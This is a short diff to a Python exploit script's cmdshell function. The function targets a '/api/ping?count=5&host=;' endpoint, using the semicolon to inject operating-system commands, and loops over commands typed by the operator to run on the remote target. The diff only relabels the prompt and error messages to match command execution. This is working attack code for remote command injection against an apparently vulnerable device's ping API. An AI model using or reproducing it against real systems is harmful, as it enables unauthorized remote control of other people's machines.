@@ -54,7 +54,7 @@ def cmdshell(url):
 		url = parse.urlparse(url)
 		url1 = url.scheme + '://' + url.netloc + '/api/ping?count=5&host=;'
 		while 1:
-			shell = input("\033[35mfilename: \033[0m")
+			shell = input("\033[35mcmd: \033[0m")
 			if shell =="exit":
 				sys.exit(0)
 			else:
@@ -69,7 +69,7 @@ def cmdshell(url):
 						print("\033[32m%s\033[0m" %text)
 
 					else:
-						print("\033[31m[-]%s file does not exist !\033[0m" %url1)
+						print("\033[31m[-]%s Command execution failed !\033[0m" %url1)
 				except Exception as e:
 					print("\033[31m[-]%s is timeout!\033[0m" %url1)
 
